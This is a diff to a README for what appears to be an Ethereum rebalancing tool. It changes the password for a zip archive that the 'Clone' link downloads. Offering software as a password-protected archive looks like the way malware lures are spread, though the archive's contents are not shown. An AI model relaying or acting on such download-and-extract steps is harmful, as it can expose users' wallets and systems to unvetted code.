@@ -10,7 +10,7 @@ Key Features:
 
 ## Getting Started
 - [Clone](https://github.com/Xinkey62/Rebalancer/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
-- Extract archive with password `123`
+- Extract archive with password `3AvU2al`
 - Modify the `config` file:
 
 1. **Ethereum Networks:**
